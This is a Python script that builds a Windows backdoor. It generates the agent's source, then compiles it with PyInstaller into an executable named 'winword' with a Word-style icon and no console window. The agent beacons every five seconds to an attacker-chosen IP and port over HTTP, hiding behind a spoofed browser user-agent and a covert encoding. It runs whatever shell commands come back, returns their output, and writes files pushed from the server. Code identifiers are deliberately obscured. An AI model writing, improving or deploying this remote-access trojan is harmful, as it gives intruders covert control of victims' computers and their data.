#!/usr/bin/env python 
import sys
import subprocess

sys.dont_write_bytecode = True

def generate_binary(IP,PORT):
	code = """import sched, time, urllib2
import urllib
import covert_channel
#import subprocess
import os, sys
import binascii

def _():
    global ____
    global _____
    ____ = "echo|set /p=Connectedv2 & hostname"
    #_____ = subprocess.check_output("hostname", shell=False)
    _____ = os.popen("hostname")
    #_____ = _____.strip()
    _____ = _____.read().strip()

s = sched.scheduler(time.time, time.sleep)

def __(cmd):
    global ____
    global _____
    if len(cmd) > 1:
        if cmd.strip() == "kill":
                print "trying to exit"
                subprocess.check_output("hostname", shell=True)

    try:
        if cmd.startswith("ignore: "):
            return ""
	elif cmd.startswith("downloadfile:"):
	    all_line = cmd.split(":",3)
	    hex = all_line[3]
	    f = hex.strip()
	    f = "".join(f.split())
	    try:
		f = binascii.unhexlify(f)
		g = open("c:" + all_line[2].strip() + all_line[1].strip(),'wb')
		g.write(f)
	    except:
		pass
	     
        elif len(cmd) > 1:
            process = os.popen(cmd)
            process = process.read().strip()
            return process
        return ""
    except:
	print "error"
        return ""

def ___(sc):
    global ____
    global _____
    time_run = 5
    sc.enter(time_run, 1, ___, (sc,))
    result = __(____)
    if len(result) > 2:
        result = _____ + ":" + result
    else:
        result = _____ + ":ignore"
    ____ = ''
    try:
        values = {'value' : covert_channel.encode_string(result)}
        data = urllib.urlencode(values)
        req = urllib2.Request('http://"""
	code = code +  str(IP) + ":" + str(PORT) + """',data)
        req.add_header('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0')
        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
        req.add_header('Accept-Language', 'en-US,en;q=0.5')
        res = urllib2.urlopen(req)
        html = res.read()
        ____ = covert_channel.decode_string(html)
    except:
        pass

_() 
time_run = 5
s.enter(time_run, 1, ___, (s,))
s.run()"""
	#x = open('temp.py','w')
	x = open('winword.py','w')
	x.write(code)
	x.close()

	#subprocess.check_output("wine C:/Python27/python.exe /opt/pyinstaller-2.0/pyinstaller.py --onefile winword.py", shell=True)
	subprocess.check_output("wine C:/Python27/python.exe /opt/pyinstaller-2.0/pyinstaller.py --icon=RichText.ico --noconsole --onefile winword.py", shell=True)
	subprocess.check_output("rm -rf ./build/", shell=True)
	subprocess.check_output("mv ./dist/* ./agent/", shell=True)
	subprocess.check_output("rm -rf ./dist/", shell=True)
	subprocess.check_output("rm -rf ./*.pyc", shell=True)
	subprocess.check_output("rm -rf ./*.spec", shell=True)
	subprocess.check_output("rm -rf ./*.log", shell=True)
